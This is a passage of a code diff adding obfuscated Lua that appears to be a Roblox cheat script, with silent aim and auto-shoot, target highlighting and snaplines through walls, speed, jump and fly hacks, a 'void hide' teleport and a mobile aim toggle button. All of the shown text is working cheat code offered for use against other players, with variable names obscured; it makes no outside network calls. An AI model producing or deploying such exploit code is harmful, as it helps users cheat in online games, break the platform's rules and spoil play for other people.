+        hum.WalkSpeed = Options.WalkSpeed.Value
+    end
+end
+
+local function _WalkSpeedChanged()
+    if not _WSConnection then
+        _WSConnection = _52.RenderStepped:Connect(_WalkSpeedLoop)
+    end
+end
+
+Options.WalkSpeed:OnChanged(_WalkSpeedChanged)
+Toggles.WalkSpeedEnabled:OnChanged(_WalkSpeedChanged)
+task.spawn(_WalkSpeedChanged)
+
+local function _JumpPowerLoop()
+    if not Toggles.JumpPowerEnabled.Value then return end
+    local char = _56.Character
+    if not char then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then
+        hum.JumpPower = Options.JumpPower.Value
+    end
+end
+
+local function _JumpPowerChanged()
+    if not _JPConnection then
+        _JPConnection = _52.RenderStepped:Connect(_JumpPowerLoop)
+    end
+end
+
+Options.JumpPower:OnChanged(_JumpPowerChanged)
+Toggles.JumpPowerEnabled:OnChanged(_JumpPowerChanged)
+task.spawn(_JumpPowerChanged)
+
+local function syncStateFromUI()
+    _104.enabled = Toggles.Enabled.Value
+    shared.hitman.silent.enabled = _104.enabled
+    _104.mode = string.lower(Options.Mode.Value)
+    _104.currentmode = string.lower(Options.Mode.Value)
+    shared.hitman.silent.mode = _104.mode
+    _104.autoshoot = Toggles.AutoShoot.Value
+    shared.hitman.checks.knock = Toggles.KnockCheck.Value
+    shared.hitman.checks.protected = Toggles.ProtectedCheck.Value
+    pcall(_WL_SyncShared)
+    shared.hitman.misc.voidhide.enabled = Toggles.VoidHide.Value
+    _243.master = Toggles.CFrameFly.Value
+end
+
+local function _244()
+    if not _243.enabled then return end
+    local _144 = _56.Character
+    if not _144 then return end
+    local _148 = _144:FindFirstChildOfClass("Humanoid")
+    local _120 = _144:FindFirstChild("HumanoidRootPart")
+    if not _148 or not _120 then return end
+    
+    _148:ChangeState(Enum.HumanoidStateType.Freefall)
+    local _249 = Vector3.zero
+    local _58 = workspace.CurrentCamera
+    
+    if _243.keys[Enum.KeyCode.W] then _249 = _249 + _58.CFrame.LookVector end
+    if _243.keys[Enum.KeyCode.S] then _249 = _249 - _58.CFrame.LookVector end
+    if _243.keys[Enum.KeyCode.A] then _249 = _249 - _58.CFrame.RightVector end
+    if _243.keys[Enum.KeyCode.D] then _249 = _249 + _58.CFrame.RightVector end
+    if _243.keys[Enum.KeyCode.Space] then _249 = _249 + Vector3.new(0, 1, 0) end
+    if _243.keys[Enum.KeyCode.LeftControl] then _249 = _249 - Vector3.new(0, 1, 0) end
+    
+    if _249.Magnitude > 0 then _249 = _249.Unit end
+    _120.AssemblyLinearVelocity = _249 * Options.FlySpeed.Value
+end
+
+local function _245()
+    local master = Toggles.CFrameFly.Value
+    local active = Options.CFrameFlyKeybind:GetState()
+    _243.enabled = master and active
+    
+    if _243.enabled then
+        if not _243.connection then 
+            _243.connection = _52.RenderStepped:Connect(function() _244() end) 
+        end
+    else
+        if _243.connection then 
+            _243.connection:Disconnect() 
+            _243.connection = nil 
+            local _144 = _56.Character
+            if _144 then
+                local _148 = _144:FindFirstChildOfClass("Humanoid")
+                if _148 then _148:ChangeState(Enum.HumanoidStateType.GettingUp) end
+            end
+        end
+    end
+end
+
+_254 = _54.InputBegan:Connect(function(_252, _253)
+    if _253 then return end
+    _243.keys[_252.KeyCode] = true
+end)
+
+_255 = _54.InputEnded:Connect(function(_252)
+    _243.keys[_252.KeyCode] = false
+end)
+
+local function _147()
+    local master = Toggles.VoidHide.Value
+    local active = Options.VoidHideKeybind:GetState()
+    local should_enable = master and active
+
+    if should_enable then
+        if not _118 then
+            _AA_wasEnabled = Toggles.AutoArmor.Value
+            if _120 then
+                _119 = _120.CFrame
+            end
+            _118 = true
+            _143()
+            _146()
+
+            if _121 then
+                _121:Disconnect()
+            end
+            
+            _121 = _52.Heartbeat:Connect(function()
+                if _118 and _120 then
+                local _t = tick()
+                _120.CFrame = CFrame.new(
+                    math.floor((_t * 4423) % 999999991) * math.sign(math.sin(_t * 7919)),
+                    math.floor((_t * 6287) % 999999973) * math.sign(math.cos(_t * 6421)),
+                    math.floor((_t * 3499) % 999999937) * math.sign(math.sin(_t * 8737))
+                ) * CFrame.Angles(
+                    (_t * 17) % (math.pi * 2),
+                    (_t * 31) % (math.pi * 2),
+                    (_t * 53) % (math.pi * 2)
+                )
+                end
+            end)
+        end
+    else
+        if _118 then
+            _118 = false
+            
+            if _121 then
+                _121:Disconnect()
+                _121 = nil
+            end
+            
+            if _120 and _119 then
+                local _148 = _56.Character:FindFirstChildOfClass("Humanoid")
+                if _148 then
+                    _148.PlatformStand = true
+                end
+                
+                _120.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                _120.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                
+                _120.CFrame = _119
+                
+                task.wait(0.5)
+                
+                if _148 then
+                    _148.PlatformStand = false
+                end
+            end
+            
+            _119 = nil
+            
+            if _AA_wasEnabled then
+                _AA_wasEnabled = false
+                Toggles.AutoArmor:SetValue(true)
+            end
+        end
+    end
+end
+
+Toggles.VoidHide:OnChanged(function(value)
+    shared.hitman.misc.voidhide.enabled = value
+    _147()
+end)
+
+Options.VoidHideKeybind:OnClick(function()
+    _147()
+end)
+
+Toggles.CFrameFly:OnChanged(function(value)
+    _243.master = value
+    _245()
+end)
+
+Options.CFrameFlyKeybind:OnClick(function()
+    _245()
+end)
+
+if _56.Character then
+    _120 = _56.Character:WaitForChild("HumanoidRootPart", 5)
+end
+
+_56.CharacterAdded:Connect(function(_144)
+    _120 = _144:WaitForChild("HumanoidRootPart", 5)
+end)
+
+local function _149()
+    if _105 then return end
+    if not _104.active then return end
+    if _isMode("auto select") or _isMode("target all") then return end
+    if not _104.targetplayer then return end
+    
+    _105 = true
+    _109 = _104.targetplayer
+    _111 = _104.targetplayer
+    
+    _110 = _58.CameraSubject
+    
+    if _109 and _109.Character then
+        _58.CameraSubject = _109.Character
+        
+        if _107 then
+            _107:Disconnect()
+        end
+        
+        _107 = _109.CharacterAdded:Connect(function(_144)
+            task.wait(1)
+            if _105 and _109 == _104.targetplayer then
+                _58.CameraSubject = _144
+            end
+        end)
+    end
+    
+    if _108 then
+        _108:Disconnect()
+    end
+    
+    _108 = _56.CharacterAdded:Connect(function(_144)
+        task.wait(1)
+        if _105 and _109 and _109.Character then
+            _58.CameraSubject = _109.Character
+        end
+    end)
+    
+    _112 = tick()
+end
+
+local function _150()
+    _105 = false
+    _109 = nil
+    _111 = nil
+    
+    if _106 then
+        _106:Disconnect()
+        _106 = nil
+    end
+    
+    if _107 then
+        _107:Disconnect()
+        _107 = nil
+    end
+    
+    if _108 then
+        _108:Disconnect()
+        _108 = nil
+    end
+    
+    if _56.Character then
+        _58.CameraSubject = _56.Character
+    elseif _110 then
+        _58.CameraSubject = _110
+    end
+end
+
+local function _151()
+    if not _105 then return end
+    if not _109 then return end
+    
+    local _152 = tick()
+    if _152 - _112 < _113 then
+        return
+    end
+    
+    _112 = _152
+    
+    if _109 and _109.Character then
+        _58.CameraSubject = _109.Character
+    elseif _105 and _56.Character then
+        _58.CameraSubject = _56.Character
+    end
+end
+
+local function _153(_154)
+    if not _154 or not _154.Character then return nil end
+    
+    local _155 = Options.HighlightFillColor.Value
+    local _156 = Options.HighlightOutlineColor.Value
+    local _157 = Options.HighlightFillColor.Transparency
+    local _158 = Options.HighlightOutlineColor.Transparency
+    
+    local _159 = Instance.new("Highlight")
+    _159.Name = "TargetHighlight_" .. _154.Name
+    _159.FillColor = _155
+    _159.OutlineColor = _156
+    _159.FillTransparency = _157
+    _159.OutlineTransparency = _158
+    _159.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    _159.Parent = _154.Character
+    
+    local _160 = _154.CharacterAdded:Connect(function(_144)
+        task.wait(1)
+        if _159 and _159.Parent then
+            _159.Parent = _144
+        end
+    end)
+    
+    return {highlight = _159, connection = _160}
+end
+
+local function _161()
+    for _162, _163 in pairs(_114) do
+        if _163.highlight then
+            _163.highlight:Destroy()
+        end
+        if _163.connection then
+            _163.connection:Disconnect()
+        end
+    end
+    _114 = {}
+    
+    for _, _164 in pairs(_115) do
+        _164:Disconnect()
+    end
+    _115 = {}
+end
+
+local function _165()
+    if not Toggles.Highlight.Value then
+        _161()
+        return
+    end
+    
+    if not _104.active then
+        _161()
+        return
+    end
+    
+    if _isMode("target all") or _isMode("multi") then
+        local _166 = _51:GetPlayers()
+        local _167 = {}
+        
+        for _, _154 in ipairs(_166) do
+            if _154 == _56 then continue end
+            if _39 > 0 and _154.UserId == _39 then continue end
+            if not _WL_Allows(_154) then continue end
+            if _154 and _154.Character then
+                local _162 = _154.Name
+                if _114[_162] then
+                    _167[_162] = _114[_162]
+                    _114[_162] = nil
+                else
+                    local _163 = _153(_154)
+                    if _163 then
+                        _167[_162] = _163
+                    end
+                end
+            end
+        end
+
+        for _162, _163 in pairs(_114) do
+            if _163.highlight then
+                _163.highlight:Destroy()
+            end
+            if _163.connection then
+                _163.connection:Disconnect()
+            end
+        end
+        
+        _114 = _167
+    elseif _isMode("auto select") then
+        _161()
+        
+        if _104.targetplayer and _104.targetplayer.Character and _WL_Allows(_104.targetplayer) then
+            if _39 > 0 and _104.targetplayer.UserId == _39 then
+                return
+            end
+            local _162 = _104.targetplayer.Name
+            local _163 = _153(_104.targetplayer)
+            if _163 then
+                _114[_162] = _163
+            end
+        end
+    else
+        _161()
+        
+        if _104.targetplayer and _104.targetplayer.Character and _WL_Allows(_104.targetplayer) then
+            if _39 > 0 and _104.targetplayer.UserId == _39 then
+                return
+            end
+            local _162 = _104.targetplayer.Name
+            local _163 = _153(_104.targetplayer)
+            if _163 then
+                _114[_162] = _163
+            end
+        end
+    end
+end
+
+local function _168(_169)
+    if _169 and _130 then
+        _141()
+    end
+    
+    if Toggles.ManipulatedText.Value and _169 then
+        _134.Visible = true
+    else
+        _134.Visible = false
+    end
+    
+    if Toggles.TargetInfo.Value and _169 then
+        _135.Visible = true
+    else
+        _135.Visible = false
+    end
+end
+
+local function _170()
+    if _130 and shared.hitman.visuals.snaplines.position == "mouse" then
+        return _54:GetMouseLocation()
+    else
+        local _171 = _58.ViewportSize
+        return Vector2.new(_171.X / 2, _171.Y / 2)
+    end
+end
+
+local function _172()
+    local _144 = _56.Character
+    if not _144 then return false end
+    local _148 = _144:FindFirstChildOfClass("Humanoid")
+    if not _148 or _148.Health <= 0 then return false end
+    return true
+end
+
+local function _173()
+    local _174 = {}
+    local _175 = _51:GetPlayers()
+    
+    for _, _154 in ipairs(_175) do
+        if _154 == _56 then continue end
+        if _39 > 0 and _154.UserId == _39 then continue end
+        if not _WL_Allows(_154) then continue end
+        table.insert(_174, _154)
+    end
+    
+    return _174
+end
+
+local function _178(_154)
+    if not Toggles.ProtectedCheck.Value then return false end
+    local _144 = _154.Character
+    if _144 then
+        local _179 = _144:FindFirstChildOfClass("ForceField")
+        if _179 then
+            return true
+        end
+    end
+    return false
+end
+
+local function _180(_154)
+    if not Toggles.KnockCheck.Value then return false end
+    local _144 = _154.Character
+    if _144 then
+        local _181 = _144:FindFirstChild("BodyEffects")
+        if _181 and _181:FindFirstChild("K.O") then
+            return _181["K.O"].Value
+        end
+    end
+    return false
+end
+
+local function _182(_154)
+    if not _154 then return false end
+    if _39 > 0 and _154.UserId == _39 then return false end
+    if not _WL_Allows(_154) then return false end
+    if _BL_IsBlocked(_154) then return false end
+    local _144 = _154.Character
+    if not _144 then return false end
+    local _148 = _144:FindFirstChildOfClass("Humanoid")
+    if not _148 or _148.Health <= 0 then return false end
+    if _180(_154) then return false end
+    if _178(_154) then return false end
+    return true
+end
+
+local function _183(_184)
+    local _185 = nil
+    local _186 = math.huge
+    
+    for _, _154 in pairs(_51:GetPlayers()) do
+        if _154 == _56 then continue end
+        if _39 > 0 and _154.UserId == _39 then continue end
+        if not _WL_Allows(_154) then continue end
+        if not _154.Character then continue end
+        
+        local _144 = _154.Character
+        local _148 = _144:FindFirstChildOfClass("Humanoid")
+        if not _148 or _148.Health <= 0 then continue end
+        if _180(_154) then continue end
+        if _178(_154) then continue end
+        
+        local _187 = _144:FindFirstChild("Head")
+        if _187 then
+            local _188, _189 = _58:WorldToScreenPoint(_187.Position)
+            if _189 then
+                local _190 = Vector2.new(_188.X, _188.Y)
+                local _191 = (_184 - _190).Magnitude
+                if _191 < _186 then
+                    _186 = _191
+                    _185 = _154
+                end
+            end
+        end
+    end
+    return _185
+end
+
+local function _192()
+    local _184
+    if _130 then
+        _184 = _54:GetMouseLocation()
+    else
+        local _171 = _58.ViewportSize
+        _184 = Vector2.new(_171.X / 2, _171.Y / 2)
+    end
+    
+    return _183(_184)
+end
+
+local function _193()
+    _104.active = false
+    _104.targetplayer = nil
+    _104.targetpart = nil
+    _104.targetposition = nil
+    _168(false)
+    
+    for i, _139 in ipairs(_136) do
+        _139.Visible = false
+    end
+    for i, _140 in ipairs(_137) do
+        _140.Visible = false
+    end
+    
+    if _105 then
+        _150()
+    end
+    _161()
+end
+
+local function _194()
+    if not _104.active then
+        _135.Text = ""
+        return
+    end
+    
+    if _isMode("target all") or _isMode("multi") then
+        local _174 = _173()
+        local _195 = 0
+        for _, _154 in ipairs(_174) do
+            if _182(_154) then
+                _195 = _195 + 1
+            end
+        end
+        if #_174 > 0 then
+            _135.Text = string.format("everyone [%d/%d]", _195, #_174)
+        else
+            _135.Text = "no players"
+        end
+    elseif _104.targetplayer then
+        local _154 = _104.targetplayer
+        if not _154 then
+            _135.Text = ""
+            return
+        end
+        
+        local _144 = _154.Character
+        if _144 then
+            local _148 = _144:FindFirstChildOfClass("Humanoid")
+            if _148 and _148.Health > 0 and not _180(_154) and not _178(_154) then
+                if not _180(_154) and _104.lasthealth[_154] then
+                    local _196 = _104.lasthealth[_154]
+                    if _148.Health < _196 then
+                        _131:Play()
+                    end
+                end
+                
+                _104.lasthealth[_154] = _148.Health
+                
+                _135.Text = string.format("%s  %.0f/%.0f", 
+                    _154.DisplayName, 
+                    math.floor(_148.Health), 
+                    math.floor(_148.MaxHealth)
+                )
+            else
+                _135.Text = _154.DisplayName .. " (invalid)"
+                _104.lasthealth[_154] = nil
+                _104.wasknocked[_154] = nil
+            end
+        else
+            _135.Text = _154.DisplayName .. " (no char)"
+            _104.lasthealth[_154] = nil
+            _104.wasknocked[_154] = nil
+        end
+    else
+        _135.Text = ""
+    end
+end
+
+local function _197()
+    if not _104.enabled then return end
+    
+    if _104.active then
+        _193()
+    else
+        if not _172() then return end
+        
+        if _isMode("target all") then
+            local _174 = _173()
+            if #_174 > 0 then
+                _104.active = true
+                _104.targetplayer = _174[1]
+                if _174[1].Character then
+                    _104.targetpart = _174[1].Character:FindFirstChild("Head")
+                    if _104.targetpart then
+                        _104.targetposition = _104.targetpart.Position
+                    end
+                    _104.wasknocked[_174[1]] = false
+                    
+                    local _148 = _174[1].Character:FindFirstChildOfClass("Humanoid")
+                    if _148 then
+                        _104.lasthealth[_174[1]] = _148.Health
+                    end
+                end
+                
+                _168(true)
+                _194()
+                
+                if Toggles.Highlight.Value then
+                    _165()
+                end
+                
+                if Toggles.Spectate.Value and _105 then
+                    _150()
+                end
+            else
+                _104.active = true
+                _104.targetplayer = nil
+                _104.targetpart = nil
+                _104.targetposition = nil
+                _168(false)
+            end
+        elseif _isMode("auto select") then
+            local _185 = _192()
+            if _185 and _182(_185) then
+                _104.active = true
+                _104.targetplayer = _185
+                _104.targetpart = _185.Character:FindFirstChild("Head")
+                _104.wasknocked[_185] = false
+                
+                if _104.targetpart then
+                    _104.targetposition = _104.targetpart.Position
+                end
+                
+                if _185.Character then
+                    local _148 = _185.Character:FindFirstChildOfClass("Humanoid")
+                    if _148 then
+                        _104.lasthealth[_185] = _148.Health
+                    end
+                end
+                
+                _168(true)
+                _194()
+                
+                if Toggles.Highlight.Value then
+                    _165()
+                end
+                
+                if Toggles.Spectate.Value and _105 then
+                    _150()
+                end
+            else
+                _104.active = true
+                _104.targetplayer = nil
+                _104.targetpart = nil
+                _104.targetposition = nil
+                _168(false)
+            end
+        elseif _isMode("multi") then
+            local _174 = _173()
+            if #_174 > 0 then
+                _104.active = true
+                _104.targetplayer = _174[1]
+                _104.targetplayers = {}
+                for _, plr in ipairs(_174) do
+                    if _182(plr) and plr.Character then
+                        table.insert(_104.targetplayers, plr)
+                    end
+                end
+                
+                if _104.targetplayer and _104.targetplayer.Character then
+                    _104.targetpart = _104.targetplayer.Character:FindFirstChild("Head")
+                    if _104.targetpart then
+                        _104.targetposition = _104.targetpart.Position
+                    end
+                    _104.wasknocked[_104.targetplayer] = false
+                    
+                    local _148 = _104.targetplayer.Character:FindFirstChildOfClass("Humanoid")
+                    if _148 then
+                        _104.lasthealth[_104.targetplayer] = _148.Health
+                    end
+                end
+                
+                _168(true)
+                _194()
+                
+                if Toggles.Highlight.Value then
+                    _165()
+                end
+                
+                if Toggles.Spectate.Value then
+                    _149()
+                end
+            else
+                _104.active = true
+                _104.targetplayer = nil
+                _104.targetpart = nil
+                _104.targetposition = nil
+                _168(false)
+            end
+        else
+            local _185 = _192()
+            if _185 and _182(_185) then
+                _104.active = true
+                _104.targetplayer = _185
+                _104.targetpart = _185.Character:FindFirstChild("Head")
+                _104.wasknocked[_185] = false
+                
+                if _104.targetpart then
+                    _104.targetposition = _104.targetpart.Position
+                end
+                
+                if _185.Character then
+                    local _148 = _185.Character:FindFirstChildOfClass("Humanoid")
+                    if _148 then
+                        _104.lasthealth[_185] = _148.Health
+                    end
+                end
+                
+                _168(true)
+                _194()
+                
+                if Toggles.Highlight.Value then
+                    _165()
+                end
+                
+                if Toggles.Spectate.Value then
+                    _149()
+                end
+            else
+                _104.active = true
+                _104.targetplayer = nil
+                _104.targetpart = nil
+                _104.targetposition = nil
+                _168(false)
+            end
+        end
+    end
+end
+
+local function _198()
+    if not Toggles.Line.Value then
+        for i, _139 in ipairs(_136) do
+            _139.Visible = false
+        end
+        for i, _140 in ipairs(_137) do
+            _140.Visible = false
+        end
+        return
+    end
+    
+    if not _104.active then
+        for i, _139 in ipairs(_136) do
+            _139.Visible = false
+        end
+        for i, _140 in ipairs(_137) do
+            _140.Visible = false
+        end
+        return
+    end
+    
+    local _199 = _170()
+    
+    local _117 = Options.LineColor.Value
+    local _200 = Options.LineColor.Transparency
+    
+    if _isMode("target all") or _isMode("multi") then
+        local _166 = _51:GetPlayers()
+        
+        while #_136 < #_166 do
+            local _139 = Drawing.new("Line")
+            _139.Color = _117
+            _139.Thickness = shared.hitman.visuals.snaplines.thickness
+            _139.Transparency = _200
+            _139.Visible = false
+            _139.ZIndex = 3
+            table.insert(_136, _139)
+            
+            local _140 = Drawing.new("Line")
+            _140.Color = Color3.new(0, 0, 0)
+            _140.Thickness = shared.hitman.visuals.snaplines.thickness + 2
+            _140.Transparency = _200
+            _140.Visible = false
+            _140.ZIndex = 2
+            table.insert(_137, _140)
+        end
+        
+        local _201 = 1
+        for _, _154 in ipairs(_166) do
+            if _154 == _56 then continue end
+            if _39 > 0 and _154.UserId == _39 then continue end
+            if not _WL_Allows(_154) then continue end
+            
+            if _136[_201] and _137[_201] then
+                local _144 = _154.Character
+                if _144 then
+                    local _202 = _144:FindFirstChild("HumanoidRootPart")
+                    if _202 then
+                        local _203, _204 = _58:WorldToViewportPoint(_202.Position)
+                        
+                        if _204 then
+                            _136[_201].From = _199
+                            _136[_201].To = Vector2.new(_203.X, _203.Y)
+                            _136[_201].Visible = true
+                            
+                            _137[_201].From = _199
+                            _137[_201].To = Vector2.new(_203.X, _203.Y)
+                            _137[_201].Visible = true
+                        else
+                            _136[_201].Visible = false
+                            _137[_201].Visible = false
+                        end
+                    else
+                        _136[_201].Visible = false
+                        _137[_201].Visible = false
+                    end
+                else
+                    _136[_201].Visible = false
+                    _137[_201].Visible = false
+                end
+            end
+            _201 = _201 + 1
+        end
+        
+        for i = _201, #_136 do
+            if _136[i] then _136[i].Visible = false end
+            if _137[i] then _137[i].Visible = false end
+        end
+    elseif _isMode("auto select") then
+        for i, _139 in ipairs(_136) do
+            _139.Visible = false
+        end
+        for i, _140 in ipairs(_137) do
+            _140.Visible = false
+        end
+        
+        if _104.targetplayer then
+            local _144 = _104.targetplayer.Character
+            if not _144 then return end
+            
+            local _202 = _144:FindFirstChild("HumanoidRootPart")
+            if _202 then
+                local _203, _204 = _58:WorldToViewportPoint(_202.Position)
+                
+                if _204 then
+                    if #_136 < 1 then
+                        local _139 = Drawing.new("Line")
+                        _139.Color = _117
+                        _139.Thickness = shared.hitman.visuals.snaplines.thickness
+                        _139.Transparency = _200
+                        _139.Visible = true
+                        _139.ZIndex = 3
+                        table.insert(_136, _139)
+                        
+                        local _140 = Drawing.new("Line")
+                        _140.Color = Color3.new(0, 0, 0)
+                        _140.Thickness = shared.hitman.visuals.snaplines.thickness + 2
+                        _140.Transparency = _200
+                        _140.Visible = true
+                        _140.ZIndex = 2
+                        table.insert(_137, _140)
+                    end
+                    
+                    _136[1].From = _199
+                    _136[1].To = Vector2.new(_203.X, _203.Y)
+                    _136[1].Visible = true
+                    
+                    _137[1].From = _199
+                    _137[1].To = Vector2.new(_203.X, _203.Y)
+                    _137[1].Visible = true
+                else
+                    if _136[1] then _136[1].Visible = false end
+                    if _137[1] then _137[1].Visible = false end
+                end
+            else
+                if _136[1] then _136[1].Visible = false end
+                if _137[1] then _137[1].Visible = false end
+            end
+        end
+    else
+        for i, _139 in ipairs(_136) do
+            _139.Visible = false
+        end
+        for i, _140 in ipairs(_137) do
+            _140.Visible = false
+        end
+        
+        if _104.targetplayer then
+            local _144 = _104.targetplayer.Character
+            if not _144 then return end
+            
+            local _202 = _144:FindFirstChild("HumanoidRootPart")
+            if _202 then
+                local _203, _204 = _58:WorldToViewportPoint(_202.Position)
+                
+                if _204 then
+                    if #_136 < 1 then
+                        local _139 = Drawing.new("Line")
+                        _139.Color = _117
+                        _139.Thickness = shared.hitman.visuals.snaplines.thickness
+                        _139.Transparency = _200
+                        _139.Visible = true
+                        _139.ZIndex = 3
+                        table.insert(_136, _139)
+                        
+                        local _140 = Drawing.new("Line")
+                        _140.Color = Color3.new(0, 0, 0)
+                        _140.Thickness = shared.hitman.visuals.snaplines.thickness + 2
+                        _140.Transparency = _200
+                        _140.Visible = true
+                        _140.ZIndex = 2
+                        table.insert(_137, _140)
+                    end
+                    
+                    _136[1].From = _199
+                    _136[1].To = Vector2.new(_203.X, _203.Y)
+                    _136[1].Visible = true
+                    
+                    _137[1].From = _199
+                    _137[1].To = Vector2.new(_203.X, _203.Y)
+                    _137[1].Visible = true
+                else
+                    if _136[1] then _136[1].Visible = false end
+                    if _137[1] then _137[1].Visible = false end
+                end
+            else
+                if _136[1] then _136[1].Visible = false end
+                if _137[1] then _137[1].Visible = false end
+            end
+        end
+    end
+end
+
+local function _205()
+    if not _104.active then return end
+    
+    if _isMode("auto select") then
+        local _184
+        if _130 and shared.hitman.visuals.snaplines.position == "mouse" then
+            _184 = _54:GetMouseLocation()
+        else
+            local _171 = _58.ViewportSize
+            _184 = Vector2.new(_171.X / 2, _171.Y / 2)
+        end
+        
+        local _185 = _183(_184)
+        
+        if _185 and _182(_185) then
+            if _104.targetplayer ~= _185 then
+                _104.targetplayer = _185
+                _104.targetpart = _185.Character:FindFirstChild("Head")
+                _104.wasknocked[_185] = false
+                
+                if _104.targetpart then
+                    _104.targetposition = _104.targetpart.Position
+                end
+                
+                if _185.Character then
+                    local _148 = _185.Character:FindFirstChildOfClass("Humanoid")
+                    if _148 then
+                        _104.lasthealth[_185] = _148.Health
+                    end
+                end
+                
+                _168(true)
+                _194()
+                
+                if Toggles.Highlight.Value then
+                    _165()
+                end
+                
+                if Toggles.Spectate.Value and _105 then
+                    _150()
+                end
+            else
+                if _104.targetplayer.Character then
+                    _104.targetpart = _104.targetplayer.Character:FindFirstChild("Head")
+                    if _104.targetpart then
+                        _104.targetposition = _104.targetpart.Position
+                    end
+                end
+            end
+        else
+            _104.targetplayer = nil
+            _104.targetpart = nil
+            _104.targetposition = nil
+            _168(false)
+            
+            if Toggles.Spectate.Value and _105 then
+                _150()
+            end
+        end
+    elseif _isMode("target all") then
+        local _174 = _173()
+        if #_174 > 0 then
+            if _104.targetplayer and not _104.picktime then
+                _104.picktime = tick()
+            end
+
+            if _104.targetplayer and _104.picktime and tick() - _104.picktime > 10 then
+                _104.targetplayer = nil
+                _104.picktime = nil
+            end
+
+            if not _104.targetplayer or not _182(_104.targetplayer) then
+                local _WL_Valid = {}
+                for _, _WL_P in ipairs(_174) do
+                    if _182(_WL_P) then
+                        table.insert(_WL_Valid, _WL_P)
+                    end
+                end
+                if #_WL_Valid > 0 then
+                    _104.targetplayer = _WL_Valid[math.random(#_WL_Valid)]
+                else
+                    _104.targetplayer = nil
+                end
+                if _104.targetplayer then
+                    _104.wasknocked[_104.targetplayer] = false
+                    _104.picktime = tick()
+                end
+            end
+            
+            if _104.targetplayer and _104.targetplayer.Character then
+                _104.targetpart = _104.targetplayer.Character:FindFirstChild("Head")
+                if _104.targetpart then
+                    _104.targetposition = _104.targetpart.Position
+                end
+            end
+            
+            _194()
+            
+            if Toggles.Highlight.Value then
+                _165()
+            end
+            
+            if Toggles.Spectate.Value and _105 then
+                _150()
+            end
+        else
+            _104.targetplayer = nil
+            _104.targetpart = nil
+            _104.targetposition = nil
+            _168(false)
+            
+            _161()
+            
+            if Toggles.Spectate.Value and _105 then
+                _150()
+            end
+        end
+    elseif _isMode("multi") then
+        local _174 = _173()
+        local validTargets = {}
+        for _, plr in ipairs(_174) do
+            if _182(plr) and plr.Character then
+                table.insert(validTargets, plr)
+            end
+        end
+        _104.targetplayers = validTargets
+        
+        local _184
+        if _130 and shared.hitman.visuals.snaplines.position == "mouse" then
+            _184 = _54:GetMouseLocation()
+        else
+            local _171 = _58.ViewportSize
+            _184 = Vector2.new(_171.X / 2, _171.Y / 2)
+        end
+        
+        local _185 = _183(_184)
+        if _185 and _182(_185) then
+            _104.targetplayer = _185
+            _104.targetpart = _185.Character:FindFirstChild("Head")
+            if _104.targetpart then
+                _104.targetposition = _104.targetpart.Position
+            end
+        elseif #validTargets > 0 then
+            _104.targetplayer = validTargets[1]
+            _104.targetpart = validTargets[1].Character:FindFirstChild("Head")
+            if _104.targetpart then
+                _104.targetposition = _104.targetpart.Position
+            end
+        else
+            _104.targetplayer = nil
+            _104.targetpart = nil
+            _104.targetposition = nil
+        end
+        
+        _168(_104.targetplayer ~= nil)
+        _194()
+        
+        if Toggles.Highlight.Value then
+            _165()
+        end
+        
+        if Toggles.Spectate.Value and _105 then
+            _149()
+        end
+    else
+        if _104.targetplayer and _104.targetplayer.Character then
+            _104.targetpart = _104.targetplayer.Character:FindFirstChild("Head")
+            if _104.targetpart then
+                _104.targetposition = _104.targetpart.Position
+            end
+        end
+    end
+end
+
+local function _206()
+    if not _104.autoshoot then return end
+    if not _104.active then return end
+    
+    local _145 = _56.Character and _56.Character:FindFirstChildOfClass("Tool")
+    if not _145 then return end
+    
+    local _207 = _145:FindFirstChild("Ammo")
+    if _207 and _207.Value <= 0 then return end
+    
+    if _isMode("target all") or _isMode("multi") then
+        local _174 = _173()
+        if #_174 == 0 then return end
+        
+        local _208 = false
+        for _, _154 in ipairs(_174) do
+            if _182(_154) then
+                _208 = true
+                break
+            end
+        end
+        
+        if _208 then
+            _145:Activate()
+            task.wait(0.1)
+        end
+    else
+        if not _104.targetplayer then return end
+        if not _182(_104.targetplayer) then return end
+        
+        _145:Activate()
+        task.wait(0.1)
+    end
+end
+
+local function _212()
+    local _213 = Options.VoidHideKeybind.Value
+    if _213 then
+        local _214 = tostring(_213):lower():gsub("enum.keycode.", "")
+        shared.hitman.misc.voidhide.key = _214
+    end
+end
+
+local function _215()
+    local _213 = Options.EnabledKeybind.Value
+    if _213 then
+        local _214 = tostring(_213):lower():gsub("enum.keycode.", "")
+        _104.keybind = _214
+        shared.hitman.silent.key = _214
+    end
+end
+
+_215()
+_212()
+syncStateFromUI()
+
+Options.EnabledKeybind:OnChanged(function()
+    _215()
+end)
+
+Options.VoidHideKeybind:OnChanged(function()
+    _212()
+end)
+
+local function _216(input, processed)
+    if processed then return end
+    
+    if input.KeyCode == Enum.KeyCode[_104.keybind:upper()] then
+        _197()
+    else
+        local _217 = Options.VoidHideKeybind.Value
+        if _217 and input.KeyCode == _217 then
+            _147()
+        end
+    end
+end
+
+if _130 then
+    _54.InputBegan:Connect(_216)
+end
+
+if _128 then
+    local _218 = Instance.new("TextButton")
+    _218.Name = "SkidCheese"
+    _218.Parent = _133
+    _218.Size = UDim2.new(0, 100, 0, 50)
+    _218.Position = UDim2.new(1, -110, 1, -60)
+    _218.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    _218.BackgroundTransparency = 0.5
+    _218.Text = "Toggle Aim"
+    _218.TextColor3 = Color3.fromRGB(255, 255, 255)
+    _218.Visible = true
+    
+    local _219 = false
+    local _220, _221, _222
+    
+    _218.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch then
+            _219 = true
+            _221 = input.Position
+            _222 = _218.Position
+            
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    _219 = false
+                end
+            end)
+        end
+    end)
+    
+    _218.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch then
+            _220 = input
+        end
+    end)
+    
+    _54.InputChanged:Connect(function(input)
+        if _219 and input == _220 then
+            local _223 = input.Position - _221
+            _218.Position = UDim2.new(_222.X.Scale, _222.X.Offset + _223.X, _222.Y.Scale, _222.Y.Offset + _223.Y)
+        end
+    end)
+    
+    _218.Activated:Connect(function()
+        _197()
+    end)
+    
+    local _224 = Instance.new("TextButton")
+    _224.Name = "legitcheese"
+    _224.Parent = _133
+    _224.Size = UDim2.new(0, 100, 0, 50)
